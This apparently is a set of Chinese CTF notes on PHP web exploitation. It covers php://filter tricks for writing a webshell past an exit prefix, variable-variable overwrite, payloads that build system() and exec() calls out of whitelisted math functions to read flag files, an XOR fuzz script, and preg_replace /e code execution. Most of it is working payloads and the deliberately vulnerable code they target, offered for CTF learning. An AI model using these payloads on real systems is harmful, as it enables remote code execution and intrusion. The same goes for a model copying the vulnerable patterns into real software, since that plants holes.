## file_put_contents

```
<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
```

①使用php://filter流的base64-decode方法会去掉字符串中非a-z0-9A-Z+/的字符而phpexit有七个字符，再加一个字符就可以进行base64解码，而我们后面的webshell即可进行正常解码

```
txt=a(base_encode_word)&filename=php://filter/write=convert.base64-encode/resource=shell.php
```

②或直接使用strip_tags去掉<?php exit; ?>，但是我们的php代码也会被去除，我们可以先使用strip_tags再使用base64或rot13进行解码

```
txt=(base_encode_word)&filename=php://filter/read=string.strip_tags|conver.base64-decode/resource=shell.php
```

③使用rot13单独完成任务

```
txt=<?cuc ?xxx>&filename=php://filter/write=string.rot13/resource=shell.php
```

## 变量覆盖

```
foreach ($_GET as $key => $value) {
    $$key = $$value;
}
```

```
解：GET:?a=flag&flag=a
```



## 数学RCE

```
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
?>
```

- `payload1:`

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php

分析：
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```

- `payload2:`

  ```
  $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
  
  分析：
  base_convert(696468,10,36) => "exec"
  $pi(8768397090111664438,10,30) => "getallheaders"
  exec(getallheaders(){1})
  //操作xx和yy，中间用逗号隔开，echo都能输出
  echo xx,yy
  ```

  - `payload3:`

```
//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
$pi=base_convert(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))


//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```

- `payload4:`

  ```
  $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag
  
  
  is_nan^(6).(4) => is_nan^64 =>_G
  tan^(1).(5) => tan^15 =>ET
  $pi=$$pi; =>$_GET
  $pi{0}($pi{1}) =>$_GET[0]($_GET[1])
  ```

  用脚本fuzz

  ```
  <?php
  $payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
  for($k=1;$k<=sizeof($payload);$k++){
      for($i = 0;$i < 9; $i++){
          for($j = 0;$j <=9;$j++){
              $exp = $payload[$k] ^ $i.$j;
              echo($payload[$k]."^$i$j"."==>$exp");
              echo "<br />";
          }
      }
  }
  ```

  

## preg_replace与代码执行

```
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
```

preg_replace 使用了 /e 模式，导致可以代码执行

```
官方payload为：`/?.*={${phpinfo()}}` ，即 GET 方式传入的参数名为 `/?.*` ，值为 `{${phpinfo()}}` 

原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
```

当preg_match函数在匹配到符号正则的字符串时，会将`'strtolower("\\1")'`这个参数当作代码来执行

但是由于非法传参，我们无法直接传入，所以找其他的正则

```
?\S*=${phpinfo()}
```

而为什么需要`${}`，是因为在 php 中，可以接受函数的返回值作为变量名，而`phpinfo()`的返回值为`TRUE`，将返回值返回作为了变量名，但是也将`phpinfo()`执行了

